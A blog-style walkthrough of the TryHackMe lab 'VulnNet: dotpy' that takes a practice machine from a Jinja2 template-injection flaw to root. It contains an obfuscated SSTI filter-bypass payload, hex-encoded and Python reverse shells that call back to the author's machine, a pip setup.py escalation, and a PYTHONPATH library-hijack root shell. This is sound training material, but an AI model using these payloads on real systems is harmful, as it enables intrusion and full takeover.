---
title: "TryHackMe | VulnNet: dotpy"
layout: post
date: 2023-11-11 19:00
tag: 
- TryHackMe
- Pentesting
- VulnNet
- Linux
- SSTI
- Meduim
- Python
- Hijacking
image: https://tryhackme-images.s3.amazonaws.com/room-icons/d0b3851085d530abbff79210cea04b5d.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "A meduim TryHackMe box, with basic web enumeration and API fuzzing."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

This machine is a python focused machine that was designed to be a bit more challenging but without anything too complicated. It requires to not only find a vulnerable endpoint but also bypass its security protection. We should also pay attention to the output the website gives us.

---

# Nmap

```bash
nmap -A -T4 10.10.113.156
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 10:51 +01
Nmap scan report for 10.10.113.156
Host is up (0.099s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.113.156:8080/login
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
```

I only have one open port which contains a login page :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106105356.png>)

Firstly, I created an account called test :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106105644.png>)

Then I am in I see dashboard in front of me, I checked all its options but nothing seemed suspicious :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106105742.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106110548.png>)

While I was looking for a venerable point to exploit, I found that when I go to some endpoint that doesn't exist, the name of the directory is reflected on the error page, so I thought directly about XSS and SSTI :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106110828.png>)

And yes is is really vulnerable to SSTI :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106110759.png>)

I noticed that there is a filtering on the input provided by the user :

{% raw %}
```js
{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}
```
{% endraw %}

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106111411.png>)

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

After a lot of tries I found the right payload :

{% raw %}
```js
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
{% endraw %}

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106113521.png>)

Now I will try to get a reverse shell :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106114320.png>)

{% raw %}
```js
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x62\x61\x73\x68\x20\x2d\x63\x20\x27\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x30\x2e\x39\x2e\x31\x2e\x31\x31\x37\x2f\x39\x39\x39\x39\x20\x30\x3e\x26\x31\x27')|attr('read')()}}
```
{% endraw %}

And I am in as web user :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106114301.png>)

# web -> system-adm

Checking the privileges of our current user we see that we can run pip3 as `system-adm` user :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106121552.png>)

[https://gtfobins.github.io/gtfobins/pip](https://gtfobins.github.io/gtfobins/pip)

I created a setup.py file that contains the content bellow and uploaded to the remote machine :

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.117",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Voilà I got a shell as `system-adm` user : 

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106122922.png>)

Now I can read the user flag :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106122439.png>)

# PE

Running sudo -l again, it shows that we can run change the PYTHONPATH variable and run the `/opt/backup.py` owned by root : 

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106122017.png>)

```python
from datetime import datetime
from pathlib import Path
import zipfile

OBJECT_TO_BACKUP = '/home/manage'  # The file or directory to backup
BACKUP_DIRECTORY = '/var/backups'  # The location to store the backups in
MAX_BACKUP_AMOUNT = 300  # The maximum amount of backups to have in BACKUP_DIRECTORY
object_to_backup_path = Path(OBJECT_TO_BACKUP)
backup_directory_path = Path(BACKUP_DIRECTORY)
assert object_to_backup_path.exists()  # Validate the object we are about to backup exists before we continue
# Validate the backup directory exists and create if required
backup_directory_path.mkdir(parents=True, exist_ok=True)
# Get the amount of past backup zips in the backup directory already
existing_backups = [
    x for x in backup_directory_path.iterdir()
    if x.is_file() and x.suffix == '.zip' and x.name.startswith('backup-')
]
# Enforce max backups and delete oldest if there will be too many after the new backup
oldest_to_newest_backup_by_name = list(sorted(existing_backups, key=lambda f: f.name))
while len(oldest_to_newest_backup_by_name) >= MAX_BACKUP_AMOUNT:  # >= because we will have another soon
    backup_to_delete = oldest_to_newest_backup_by_name.pop(0)
    backup_to_delete.unlink()
# Create zip file (for both file and folder options)
backup_file_name = f'backup-{datetime.now().strftime("%Y%m%d%H%M%S")}-{object_to_backup_path.name}.zip'
zip_file = zipfile.ZipFile(str(backup_directory_path / backup_file_name), mode='w')
if object_to_backup_path.is_file():
    # If the object to write is a file, write the file
    zip_file.write(
        object_to_backup_path.absolute(),
        arcname=object_to_backup_path.name,
        compress_type=zipfile.ZIP_DEFLATED
    )
elif object_to_backup_path.is_dir():
    # If the object to write is a directory, write all the files
    for file in object_to_backup_path.glob('**/*'):
        if file.is_file():
            zip_file.write(
                file.absolute(),
                arcname=str(file.relative_to(object_to_backup_path)),
                compress_type=zipfile.ZIP_DEFLATED
            )
# Close the created zip file
zip_file.close()
```

Analyzing the source code of the file, we see that it imports the zipfile python library, so I directly thought about python library hijacking.

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106122351.png>)

I created a malicious zipfile in /tmp which spawns a root shell and I made it executable :

```python
import os
os.system('/bin/bash')
```

The I changed the PYTHONPATH to point on the /tmp folder :

```bash
chmod +x zipfile.py
sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/backup.py
```

BOOM I got a shell as root :

![Alt text](<../../../assets/images/THMPics/Pasted image 20231106121827.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>